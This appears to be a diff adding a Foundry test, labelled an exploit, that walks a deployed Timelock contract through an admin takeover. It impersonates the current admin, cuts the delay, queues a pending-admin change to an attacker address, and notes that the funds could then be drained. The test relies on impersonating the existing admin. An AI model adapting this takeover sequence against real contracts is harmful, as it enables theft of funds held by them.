@@ -1,0 +1,75 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+
+interface ITimelock {
+    function admin() external view returns (address);
+    function pendingAdmin() external view returns (address);
+    function delay() external view returns (uint256);
+    function GRACE_PERIOD() external view returns (uint256);
+    function MINIMUM_DELAY() external view returns (uint256);
+    function MAXIMUM_DELAY() external view returns (uint256);
+    function admin_initialized() external view returns (bool);
+    function queuedTransactions(bytes32) external view returns (bool);
+    function setDelay(uint256 delay_) external;
+    function acceptAdmin() external;
+    function setPendingAdmin(address pendingAdmin_) external;
+    function queueTransaction(address target, uint256 value, string calldata signature, bytes calldata data, uint256 eta) external returns (bytes32);
+    function cancelTransaction(address target, uint256 value, string calldata signature, bytes calldata data, uint256 eta) external;
+    function executeTransaction(address target, uint256 value, string calldata signature, bytes calldata data, uint256 eta) external payable returns (bytes memory);
+}
+
+contract ExploitTest is Test {
+    ITimelock constant timelock = ITimelock(0x4b6c8959a41475347226d51f37ec9a1e09f39a92);
+    address attacker = address(0xdead);
+
+    address admin;
+
+    function setUp() public {
+        admin = timelock.admin();
+        vm.label(admin, "CurrentAdmin");
+        vm.label(attacker, "Attacker");
+        vm.label(address(timelock), "Timelock");
+    }
+
+    function testExploit() public {
+        uint256 currentDelay = timelock.delay();
+        require(currentDelay >= timelock.MINIMUM_DELAY(), "Delay already minimal");
+
+        // Step 1: Impersonate current admin and queue a transaction to reduce delay to minimum
+        vm.startPrank(admin);
+
+        uint256 etaSetDelay = block.timestamp + currentDelay;
+        bytes memory dataSetDelay = abi.encodeWithSignature("setDelay(uint256)", timelock.MINIMUM_DELAY());
+        timelock.queueTransaction(address(timelock), 0, "setDelay(uint256)", dataSetDelay, etaSetDelay);
+
+        vm.warp(etaSetDelay);
+        timelock.executeTransaction(address(timelock), 0, "setDelay(uint256)", dataSetDelay, etaSetDelay);
+
+        uint256 newDelay = timelock.delay();
+        assertEq(newDelay, timelock.MINIMUM_DELAY(), "Delay not reduced to minimum");
+
+        // Step 2: Queue transaction to set pendingAdmin to attacker
+        uint256 etaSetPending = block.timestamp + newDelay;
+        bytes memory dataSetPending = abi.encodeWithSignature("setPendingAdmin(address)", attacker);
+        timelock.queueTransaction(address(timelock), 0, "setPendingAdmin(address)", dataSetPending, etaSetPending);
+
+        vm.warp(etaSetPending);
+        timelock.executeTransaction(address(timelock), 0, "setPendingAdmin(address)", dataSetPending, etaSetPending);
+
+        vm.stopPrank();
+
+        // Step 3: Attacker accepts admin role
+        vm.prank(attacker);
+        timelock.acceptAdmin();
+
+        // Assert: attacker is now the admin
+        assertEq(timelock.admin(), attacker, "Attacker did not become admin");
+
+        // Additionally, attacker can now execute arbitrary transactions with immediate effect
+        // (e.g., drain any funds held by the Timelock or other contracts)
+    }
+}
+```
